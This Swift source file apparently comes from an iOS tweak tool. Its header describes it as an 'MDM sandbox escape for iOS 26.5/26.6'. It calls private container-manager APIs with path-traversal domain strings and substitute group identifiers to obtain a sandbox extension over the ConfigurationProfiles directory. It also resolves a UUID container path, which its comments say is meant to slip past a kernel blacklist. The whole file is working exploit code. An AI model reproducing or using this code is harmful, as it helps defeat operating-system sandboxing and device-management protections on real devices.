//
//  mdm.swift
//  mond
//
//  MDM sandbox escape for iOS 26.5/26.6.
//
//  bad_query returns -4 for configurationprofiles because iOS 26.5/26.6 refuses
//  to issue sandbox extension tokens for that systemgroup via copy_sandbox_token.
//  container_object_sandbox_extension_activate is used instead.
//
//  Critical: after activate() we VERIFY actual access with Darwin.open() on the
//  ConfigurationProfiles directory. If the directory cannot be opened, activate()
//  did not scope the extension correctly and we return nil.
//

import Foundation
import XPC
import Darwin

private typealias mdm_create_fn   = @convention(c) () -> UnsafeMutableRawPointer?
private typealias mdm_activate_fn = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Bool
private typealias mdm_free_fn     = @convention(c) (UnsafeMutableRawPointer?) -> Void
private typealias mdm_u64_fn      = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
private typealias mdm_bool_fn     = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Void
private typealias mdm_obj_fn      = @convention(c) (UnsafeMutableRawPointer?, (any OS_xpc_object)?) -> Void
private typealias mdm_str_fn      = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>?) -> Void
private typealias mdm_res_fn      = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?

private func mdm_sym<T>(_ h: UnsafeMutableRawPointer, _ name: String, as: T.Type) -> T? {
    guard let s = dlsym(h, name) else { print("(mdm) missing: \(name)"); return nil }
    return unsafeBitCast(s, to: T.self)
}

/// Try to activate a sandbox extension for the configurationprofiles SystemGroup.
/// Verifies actual directory access via Darwin.open before returning.
/// Returns TweakPaths.mdm_profiles on success, nil on failure.
private func try_activate_mdm(lib: UnsafeMutableRawPointer, groupID: String = "systemgroup.com.apple.configurationprofiles", domain: String) -> String? {
    guard
        let create     = mdm_sym(lib, "container_query_create",                     as: mdm_create_fn.self),
        let activate   = mdm_sym(lib, "container_object_sandbox_extension_activate", as: mdm_activate_fn.self),
        let free       = mdm_sym(lib, "container_query_free",                        as: mdm_free_fn.self),
        let set_cls    = mdm_sym(lib, "container_query_set_class",                   as: mdm_u64_fn.self),
        let set_tran   = mdm_sym(lib, "container_query_set_transient",               as: mdm_bool_fn.self),
        let set_gids   = mdm_sym(lib, "container_query_set_group_identifiers",       as: mdm_obj_fn.self),
        let set_plat   = mdm_sym(lib, "container_query_operation_set_platform",      as: mdm_u64_fn.self),
        let set_flag   = mdm_sym(lib, "container_query_operation_set_flags",         as: mdm_u64_fn.self),
        let set_part   = mdm_sym(lib, "container_query_operation_set_part",          as: mdm_u64_fn.self),
        let get_res    = mdm_sym(lib, "container_query_get_single_result",           as: mdm_res_fn.self)
    else { return nil }

    // Optional domain setter
    let set_domain = mdm_sym(lib, "container_query_operation_set_part_domain", as: mdm_str_fn.self)

    guard let q = create() else { return nil }

    set_cls(q, 13)
    set_tran(q, false)
    let arr = xpc_array_create(nil, 0)
    xpc_array_set_string(arr, XPC_ARRAY_APPEND, groupID)
    set_gids(q, arr)
    set_plat(q, 2)
    set_flag(q, (1 << 32) | (1 << 39))
    set_part(q, 3)  // Part 3 = Library/Caches anchor

    if !domain.isEmpty {
        domain.withCString { set_domain?(q, $0) }
    }

    guard let res = get_res(q) else {
        free(q)
        print("(mdm) [\(groupID):\(domain)] get_single_result returned nil")
        return nil
    }

    let ok = activate(res, true)
    free(q)

    guard ok else {
        print("(mdm) [\(groupID):\(domain)] activate returned false")
        return nil
    }

    // === CRITICAL VERIFICATION ===
    // activate() returning true does NOT guarantee the extension covers
    // ConfigurationProfiles. Verify with a direct Darwin.open() on the directory.
    let targetPath = TweakPaths.mdm_profiles
    let dirFd = targetPath.withCString { Darwin.open($0, O_RDONLY | O_DIRECTORY | O_CLOEXEC) }
    if dirFd >= 0 {
        Darwin.close(dirFd)
        print("(mdm) [\(groupID):\(domain)] activation verified — ConfigurationProfiles is accessible")
        return targetPath
    }
    let err = errno
    print("(mdm) [\(groupID):\(domain)] activate succeeded but open(\(targetPath)) failed: \(String(cString: strerror(err))) (errno=\(err))")
    return nil
}

/// Activate a sandbox extension for the ConfigurationProfiles directory.
/// Tries multiple domain strategies and group identifiers in order.
func grant_mdm_access() -> String? {
    guard let lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW) else {
        print("(mdm) dlopen failed")
        return nil
    }
    defer { dlclose(lib) }

    let fullDomain = "../../../../../../../../\(TweakPaths.mdm_profiles)"
    let groupIDs = [
        "systemgroup.com.apple.mobilegestaltcache",
        "systemgroup.com.apple.configurationprofiles"
    ]
    let domains = [
        fullDomain,
        "../ConfigurationProfiles",
        ""
    ]

    for gID in groupIDs {
        for d in domains {
            if let path = try_activate_mdm(lib: lib, groupID: gID, domain: d) {
                print("(mdm) Successfully activated access using groupID \(gID) and domain '\(d)'")
                return path
            }
        }
    }

    print("(mdm) all activation strategies failed")
    return nil
}

/// Resolve the UUID-based container path for configurationprofiles.
/// Even when copy_sandbox_token fails (-4), container_object_get_path still returns
/// the REAL path. The UUID path avoids the "configurationprofiles" string that
/// the iOS 26.5+ kernel blacklist checks.
///
/// Named path:  /private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/
/// UUID path:   /private/var/containers/Shared/SystemGroup/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX/
///
/// The UUID path does NOT contain "configurationprofiles" → may bypass kernel filter.
private typealias mdm_path_fn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafePointer<CChar>?

func resolve_mdm_uuid_path() -> String? {
    guard let lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW) else { return nil }
    defer { dlclose(lib) }

    guard
        let create   = mdm_sym(lib, "container_query_create",             as: mdm_create_fn.self),
        let free     = mdm_sym(lib, "container_query_free",               as: mdm_free_fn.self),
        let set_cls  = mdm_sym(lib, "container_query_set_class",          as: mdm_u64_fn.self),
        let set_tran = mdm_sym(lib, "container_query_set_transient",      as: mdm_bool_fn.self),
        let set_gids = mdm_sym(lib, "container_query_set_group_identifiers", as: mdm_obj_fn.self),
        let set_plat = mdm_sym(lib, "container_query_operation_set_platform", as: mdm_u64_fn.self),
        let set_flag = mdm_sym(lib, "container_query_operation_set_flags", as: mdm_u64_fn.self),
        let get_res  = mdm_sym(lib, "container_query_get_single_result",  as: mdm_res_fn.self),
        let get_path = mdm_sym(lib, "container_object_get_path",          as: mdm_path_fn.self)
    else { return nil }

    guard let q = create() else { return nil }

    set_cls(q, 13)
    set_tran(q, false)
    let arr = xpc_array_create(nil, 0)
    xpc_array_set_string(arr, XPC_ARRAY_APPEND, "systemgroup.com.apple.configurationprofiles")
    set_gids(q, arr)
    set_plat(q, 2)
    set_flag(q, (1 << 32) | (1 << 39))

    guard let res = get_res(q) else {
        free(q)
        print("(mdm-uuid) get_single_result returned nil")
        return nil
    }

    guard let c_path = get_path(res) else {
        free(q)
        print("(mdm-uuid) container_object_get_path returned nil")
        return nil
    }

    let uuidPath = String(cString: c_path)
    free(q)
    print("(mdm-uuid) resolved container UUID path: \(uuidPath)")
    return uuidPath
}
